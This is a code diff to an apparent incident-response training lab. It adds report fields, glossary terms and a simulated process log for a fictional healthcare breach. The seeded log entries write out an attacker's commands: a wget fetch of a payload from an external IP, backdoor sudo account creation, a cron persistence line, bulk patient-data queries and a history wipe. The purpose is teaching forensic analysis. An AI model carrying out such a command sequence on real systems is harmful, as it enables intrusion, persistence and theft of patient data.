@@ -659,6 +659,15 @@ failed_attempts = {}
     </div>
 
     <div class="report-section">
+      <h3>RECON — What did Jordan tell you?</h3>
+      <p class="field-label">Write down all of the information you gained about the company's controls and systems from your interview with Jordan:</p>
+      <textarea class="report-field" id="pb-recon"></textarea>
+
+      <p class="field-label" style="margin-top:16px;">Control Gap Analysis — Based on your interview with Jordan and your technical findings, list the security controls that were missing or failed. For each, state the risk it created:</p>
+      <textarea class="report-field" id="pb-recon-gaps"></textarea>
+    </div>
+
+    <div class="report-section">
       <h3>IDENTIFY — What assets were involved?</h3>
       <p class="field-label">Which systems, accounts, or data were affected?</p>
       <textarea class="report-field" id="pb-identify"></textarea>
@@ -668,8 +677,8 @@ failed_attempts = {}
 
     <div class="report-section">
       <h3>PROTECT — What controls failed or were missing?</h3>
-      <p class="field-label">List the protective controls that were absent or ineffective:</p>
-      <textarea class="report-field" id="pb-protect" placeholder="e.g., No MFA on SSH, weak password policy, no account lockout after failed attempts..."></textarea>
+      <p class="field-label">Based on your investigation, which protective controls should have been in place to prevent this breach?</p>
+      <textarea class="report-field" id="pb-protect"></textarea>
     </div>
 
     <div class="report-section">
@@ -683,7 +692,7 @@ failed_attempts = {}
     <div class="report-section">
       <h3>RESPOND — What actions should be taken immediately?</h3>
       <p class="field-label">List your immediate containment and response steps in order:</p>
-      <textarea class="report-field" id="pb-respond" placeholder="1. Isolate the server from the network&#10;2. Disable the svc_backup account&#10;3. Remove the malicious cron job&#10;4. ..."></textarea>
+      <textarea class="report-field" id="pb-respond"></textarea>
       <p class="field-label">Who should be notified, and why? (include any legal/regulatory obligations)</p>
       <textarea class="report-field" id="pb-notify"></textarea>
     </div>
@@ -735,7 +744,7 @@ failed_attempts = {}
     <div class="report-section">
       <h3>2. Attack Timeline</h3>
       <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Reconstruct the attacker's steps in chronological order based on your SIEM and terminal investigation.</p>
-      <textarea class="report-field" id="rpt-timeline" style="min-height:140px;" placeholder="[01:52 AM] First failed SSH login attempt from 185.220.101.42&#10;[02:14 AM] Successful SSH login — brute force succeeded&#10;[02:14 AM] Attacker created backdoor account 'svc_backup'&#10;[02:17 AM] ..."></textarea>
+      <textarea class="report-field" id="rpt-timeline" style="min-height:140px;"></textarea>
     </div>
 
     <div class="report-section">
@@ -743,35 +752,29 @@ failed_attempts = {}
       <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Detail each finding. For each one, note: what you found, where you found it, and its significance.</p>
 
       <p class="field-label">Finding 1 — Brute Force SSH Attack</p>
-      <textarea class="report-field" id="rpt-f1" style="min-height:80px;" placeholder="Describe the brute force evidence you found in the SIEM and/or Python task..."></textarea>
+      <textarea class="report-field" id="rpt-f1" style="min-height:80px;"></textarea>
 
       <p class="field-label">Finding 2 — Unauthorized Account Creation</p>
-      <textarea class="report-field" id="rpt-f2" style="min-height:80px;" placeholder="Describe the backdoor account you found and its implications..."></textarea>
+      <textarea class="report-field" id="rpt-f2" style="min-height:80px;"></textarea>
 
       <p class="field-label">Finding 3 — Persistence Mechanism (Cron Job)</p>
-      <textarea class="report-field" id="rpt-f3" style="min-height:80px;" placeholder="Describe the malicious cron job, what it does, and why it matters..."></textarea>
+      <textarea class="report-field" id="rpt-f3" style="min-height:80px;"></textarea>
 
       <p class="field-label">Finding 4 — Database Query Exfiltration Attempt</p>
-      <textarea class="report-field" id="rpt-f4" style="min-height:80px;" placeholder="Describe the suspicious database queries you found in the SIEM..."></textarea>
+      <textarea class="report-field" id="rpt-f4" style="min-height:80px;"></textarea>
 
       <p class="field-label">Finding 5 — Anti-Forensics (Deleted Bash History)</p>
-      <textarea class="report-field" id="rpt-f5" style="min-height:80px;" placeholder="Describe what you found (or didn't find) in bash history and what it suggests..."></textarea>
+      <textarea class="report-field" id="rpt-f5" style="min-height:80px;"></textarea>
     </div>
 
     <div class="report-section">
       <h3>4. NIST CSF Framework Mapping</h3>
       <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Map your findings to the five NIST CSF functions. Identify what failed and what was missing.</p>
-      <textarea class="report-field" id="rpt-nist" style="min-height:160px;" placeholder="IDENTIFY: ...&#10;&#10;PROTECT: ...&#10;&#10;DETECT: ...&#10;&#10;RESPOND: ...&#10;&#10;RECOVER: ..."></textarea>
+      <textarea class="report-field" id="rpt-nist" style="min-height:160px;"></textarea>
     </div>
 
     <div class="report-section">
-      <h3>5. Control Gap Analysis</h3>
-      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Based on your interview with Jordan and your technical findings, list the security controls that were missing or failed. For each, state the risk it created.</p>
-      <textarea class="report-field" id="rpt-controls" style="min-height:160px;" placeholder="Control Gap 1: No multi-factor authentication on SSH&#10;Risk: Enabled brute force attack to succeed with only a password&#10;&#10;Control Gap 2: ..."></textarea>
-    </div>
-
-    <div class="report-section">
-      <h3>6. Recommendations</h3>
+      <h3>5. Recommendations</h3>
       <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Provide prioritized, actionable recommendations. Separate immediate actions from long-term improvements.</p>
       <p class="field-label">Immediate (within 24-48 hours)</p>
       <textarea class="report-field" id="rpt-rec-imm" style="min-height:100px;"></textarea>
@@ -782,7 +785,7 @@ failed_attempts = {}
     </div>
 
     <div class="report-section">
-      <h3>7. Legal &amp; Ethical Considerations</h3>
+      <h3>6. Legal &amp; Ethical Considerations</h3>
       <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">This company handles PHI and is subject to HIPAA. Answer the following:</p>
 
       <p class="field-label">Does this incident trigger HIPAA breach notification requirements? Why or why not?</p>
@@ -796,7 +799,7 @@ failed_attempts = {}
     </div>
 
     <div class="report-section">
-      <h3>8. Appendix — Completed IR Playbook</h3>
+      <h3>7. Appendix — Completed IR Playbook</h3>
       <p style="color:#a8b8d0; font-size:13px;">Your IR Playbook from Phase 5 is automatically included as an appendix to this report. Ensure it is complete before exporting to PDF.</p>
       <div class="alert alert-blue" style="margin-top:10px;">Your Phase 5 playbook entries will be referenced here in a complete submission. Review Phase 5 to ensure all fields are filled out.</div>
     </div>
@@ -1006,13 +1009,45 @@ failed_attempts = {}
         <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Anti-Forensics</p>
         <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Techniques used by attackers to hide their activity or hinder investigation. Common examples: deleting log files, clearing shell history, renaming malicious files to look legitimate.</p>
       </div>
-      <div style="padding:10px 12px; border-right:1px solid #21262d;">
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
         <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Least Privilege</p>
         <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A security principle stating that users and systems should only have the minimum access needed to do their job. Violations create unnecessary risk if an account is compromised.</p>
       </div>
-      <div style="padding:10px 12px;">
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
         <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Network Segmentation</p>
         <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Dividing a network into isolated zones so that a breach in one area doesn't automatically give access to everything else. A flat network (no segmentation) means one compromised host can reach all others.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">SSH &amp; Authorized Keys</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">SSH (Secure Shell) is a protocol for remote server access. A server can be configured to allow login via a cryptographic key instead of a password. Authorized public keys are stored in <code>~/.ssh/authorized_keys</code> — if an attacker adds their key there, they can log in without a password indefinitely.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Backdoor Account</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A user account created by an attacker to maintain access after the initial intrusion. These accounts are often named to blend in with legitimate service accounts. Look for accounts created at unusual hours or with elevated privileges that don't match their apparent purpose.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Package Manager / dpkg</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Software on Linux is installed through a package manager. Every installation is logged — typically in <code>/var/log/dpkg.log</code>. Unexpected software installed at odd hours can be a significant indicator of compromise.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Process Log / Audit Trail</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A record of commands or processes that ran on a system, including who ran them and when. Distinct from auth logs (which track logins) — process logs track what happened after someone was already in. Critical for reconstructing attacker behavior.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Lateral Movement</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">After gaining initial access, attackers often move to other systems or accounts within the network. Signs include logins from internal IPs at unusual times, use of service accounts for interactive sessions, or access to systems unrelated to the entry point.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Defense in Depth</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A security strategy that layers multiple controls so that if one fails, others still provide protection. No single control is assumed to be perfect. An attacker who bypasses one layer — say, a firewall — should still face authentication requirements, logging, and monitoring.</p>
+      </div>
+      <div style="padding:10px 12px; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Log Correlation</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">The practice of connecting events across multiple log sources to reconstruct what happened. A single log rarely tells the whole story — auth logs, process logs, firewall logs, and database logs together reveal the full attack chain.</p>
+      </div>
+      <div style="padding:10px 12px;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Orphaned Account</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A user account that remains active after the person no longer needs access — a former employee, a contractor whose engagement ended, or a service account for a decommissioned system. Orphaned accounts are a common attack vector and should be disabled or removed promptly.</p>
       </div>
     </div>
   </div>
@@ -1563,6 +1598,11 @@ async function initSiem() {
     is_admin INTEGER, account_status TEXT
   );`);
 
+  siemDB.run(`CREATE TABLE process_log (
+    id INTEGER PRIMARY KEY, timestamp TEXT, hostname TEXT,
+    pid INTEGER, username TEXT, command TEXT, flagged INTEGER
+  );`);
+
   // SSH brute force events
   const bruteIp = '185.220.101.42';
   const baseTime = new Date('2026-05-18T01:52:00');
@@ -1655,6 +1695,24 @@ async function initSiem() {
   siemDB.run(`INSERT INTO db_query_log VALUES (15,'2026-05-18 08:45:03','dev_marcus','SELECT id, name, created_at FROM patients ORDER BY created_at DESC LIMIT 100',100,0)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (16,'2026-05-18 09:02:11','jreyes','SELECT * FROM user_accounts',6,0)`);
 
+  // Process log — attack sequence
+  siemDB.run(`INSERT INTO process_log VALUES (1,'2026-05-18 02:14:38','clearpath-prod-01',3249,'root','wget -q http://185.220.101.42:8080/update_check -O /tmp/.update_check',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (2,'2026-05-18 02:14:41','clearpath-prod-01',3250,'root','chmod +x /tmp/.update_check',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (3,'2026-05-18 02:14:44','clearpath-prod-01',3251,'root','useradd -m -u 1004 -g 0 svc_backup',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (4,'2026-05-18 02:14:46','clearpath-prod-01',3252,'root','usermod -aG sudo svc_backup',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (5,'2026-05-18 02:14:50','clearpath-prod-01',3253,'root','echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/svc_backup_task',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (6,'2026-05-18 02:19:02','clearpath-prod-01',3289,'root','mysql -u root -p clearpath_db -e "SELECT * FROM patients LIMIT 1000"',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (7,'2026-05-18 02:19:39','clearpath-prod-01',3290,'root','mysql -u root -p clearpath_db -e "SELECT name, dob, ssn, insurance_id FROM patients WHERE billing_status = active"',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (8,'2026-05-18 02:20:11','clearpath-prod-01',3291,'root','mysql -u root -p clearpath_db -e "SELECT * FROM billing_records WHERE created_at > 2026-01-01"',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (9,'2026-05-18 02:21:30','clearpath-prod-01',3292,'root','mysql -u root -p clearpath_db -e "SELECT * FROM user_credentials"',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (10,'2026-05-18 02:22:01','clearpath-prod-01',3295,'root','history -c',1)`);
+
+  // Process log — normal background activity
+  siemDB.run(`INSERT INTO process_log VALUES (11,'2026-05-18 00:05:02','clearpath-prod-01',2901,'root','/usr/sbin/mysqldump clearpath_db --result-file=/var/backups/db_nightly.sql',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (12,'2026-05-17 17:33:14','clearpath-prod-01',2744,'dev_marcus','mysql -u dev_marcus clearpath_db -e "SELECT COUNT(*) FROM patients"',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (13,'2026-05-18 08:10:19','clearpath-prod-01',3401,'billing_svc','/usr/bin/python3 /opt/billing/run_daily.py',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (14,'2026-05-18 08:31:00','clearpath-prod-01',3450,'analyst','/usr/bin/bash',0)`);
+
   // User accounts
   const accounts = [
     ['root','2020-03-01 00:00:00','2026-05-18 02:14:33',1,'active'],
@@ -1694,7 +1752,7 @@ function mysqlToSqlite(sql) {
 
   // SHOW TABLES
   if(/^SHOW TABLES;?$/.test(upper))
-    return { fake: [['Tables_in_clearpath_siem'], [['events'],['db_query_log'],['user_accounts']]] };
+    return { fake: [['Tables_in_clearpath_siem'], [['events'],['db_query_log'],['process_log'],['user_accounts']]] };
 
   // SHOW DATABASES
   if(/^SHOW DATABASES;?$/.test(upper))
@@ -1874,12 +1932,13 @@ const termFS = {
   '/etc/cron.d':          { v:['anacron','php','svc_backup_task'],             h:[],                                      p:'/etc' },
   '/tmp':                 { v:['tmpPzQ3x1'],                                   h:['.update_check'],                       p:'/' },
   '/var':                 { v:['log'],                                         h:[],                                      p:'/' },
-  '/var/log':             { v:['auth.log','syslog'],                           h:[],                                      p:'/var' },
+  '/var/log':             { v:['auth.log','syslog','dpkg.log'],                h:[],                                      p:'/var' },
   '/home':                { v:['analyst','jreyes','billing_svc','dev_marcus','svc_backup'], h:[],                         p:'/' },
   '/home/analyst':        { v:['logs','notes.txt','Desktop','Documents'],      h:['.bash_history','.bashrc','.bash_logout'], p:'/home' },
   '/home/analyst/logs':   { v:['access.log','error.log'],                     h:[],                                      p:'/home/analyst' },
   '/home/jreyes':         { v:[],                                              h:['.bash_history','.bashrc'],             p:'/home' },
   '/home/svc_backup':     { v:[],                                              h:['.bash_history','.ssh'],                p:'/home' },
+  '/home/svc_backup/.ssh': { v:['authorized_keys'],                           h:[],                                      p:'/home/svc_backup' },
   '/home/billing_svc':    { v:[],                                              h:['.bashrc'],                             p:'/home' },
   '/home/dev_marcus':     { v:[],                                              h:['.bashrc','.bash_history'],             p:'/home' },
   '/bin':                 { v:['bash','sh','ls','cat','grep','ps'],            h:[],                                      p:'/' },
@@ -1928,8 +1987,13 @@ May 18 02:14:33 clearpath-prod-01 sshd[3248]: pam_unix(sshd:session): session op
 May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0, home=/home/svc_backup
 May 18 02:14:52 clearpath-prod-01 usermod[3252]: add 'svc_backup' to group 'sudo'
 May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`,
-  '/var/log/syslog': `May 18 02:14:55 clearpath-prod-01 CRON[3260]: (root) CMD (/tmp/.update_check 2>/dev/null)
+  '/var/log/syslog': `May 18 02:14:11 clearpath-prod-01 dpkg: install netcat-openbsd:amd64 1.218-4ubuntu1
+May 18 02:14:14 clearpath-prod-01 dpkg: install wget:amd64 1.21.2-2ubuntu1
+May 18 02:14:38 clearpath-prod-01 kernel: [3249] root wget -q http://185.220.101.42:8080/update_check -O /tmp/.update_check
+May 18 02:14:50 clearpath-prod-01 kernel: [3253] root echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/svc_backup_task
+May 18 02:14:55 clearpath-prod-01 CRON[3260]: (root) CMD (/tmp/.update_check 2>/dev/null)
 May 18 02:19:55 clearpath-prod-01 CRON[3301]: (root) CMD (/tmp/.update_check 2>/dev/null)
+May 18 02:22:01 clearpath-prod-01 kernel: [3295] root history -c
 May 18 02:24:55 clearpath-prod-01 CRON[3341]: (root) CMD (/tmp/.update_check 2>/dev/null)`,
   '/home/analyst/.bash_history': `# .bash_history (last 3 entries only — earlier entries deleted)
 ls /tmp
@@ -1953,6 +2017,20 @@ whoami
 id
 cat /etc/passwd
 uname -a`,
+  '/home/svc_backup/.ssh': 'cat: /home/svc_backup/.ssh: Is a directory',
+  '/home/svc_backup/.ssh/authorized_keys': `# SSH authorized keys — svc_backup
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vX2m...k9pQ attacker@anon`,
+  '/home/dev_marcus/.bash_history': `# .bash_history — dev_marcus
+cd /opt/billing
+ls
+git pull origin main
+mysql -u dev_marcus clearpath_db -e "SELECT COUNT(*) FROM patients"
+exit`,
+  '/var/log/dpkg.log': `2026-05-18 02:14:09 startup packages configure
+2026-05-18 02:14:11 install netcat-openbsd:amd64 <none> 1.218-4ubuntu1
+2026-05-18 02:14:12 status installed netcat-openbsd:amd64 1.218-4ubuntu1
+2026-05-18 02:14:14 install wget:amd64 <none> 1.21.2-2ubuntu1
+2026-05-18 02:14:15 status installed wget:amd64 1.21.2-2ubuntu1`,
 };
 
 // Resolve a path (absolute or relative) against cwd. Returns absolute path.
@@ -2182,12 +2260,12 @@ async function saveMyWork() {
     'siem-notes','terminal-notes',
     'python-output','python-bugs','python-q1','python-q2','python-q3','python-q4',
     'pb-name','pb-datetime','pb-analyst','pb-class','pb-severity','pb-desc',
-    'pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
+    'pb-recon','pb-recon-gaps','pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
     'pb-respond','pb-notify','pb-recover','pb-improve',
     'rpt-analyst','rpt-date','rpt-client','rpt-class',
     'rpt-exec','rpt-timeline',
     'rpt-f1','rpt-f2','rpt-f3','rpt-f4','rpt-f5',
-    'rpt-nist','rpt-controls',
+    'rpt-nist',
     'rpt-rec-imm','rpt-rec-short','rpt-rec-long',
     'rpt-hipaa','rpt-ethics','rpt-ethical-reasoning',
     'nb-freeform','nb-iocs','nb-timeline','nb-questions','nb-controls',
@@ -2289,12 +2367,12 @@ const ALL_FIELD_IDS = [
   'siem-notes','terminal-notes',
   'python-output','python-bugs','python-q1','python-q2','python-q3','python-q4',
   'pb-name','pb-datetime','pb-analyst','pb-class','pb-severity','pb-desc',
-  'pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
+  'pb-recon','pb-recon-gaps','pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
   'pb-respond','pb-notify','pb-recover','pb-improve',
   'rpt-analyst','rpt-date','rpt-client','rpt-class',
   'rpt-exec','rpt-timeline',
   'rpt-f1','rpt-f2','rpt-f3','rpt-f4','rpt-f5',
-  'rpt-nist','rpt-controls',
+  'rpt-nist',
   'rpt-rec-imm','rpt-rec-short','rpt-rec-long',
   'rpt-hipaa','rpt-ethics','rpt-ethical-reasoning',
   'nb-freeform','nb-iocs','nb-timeline','nb-questions','nb-controls',
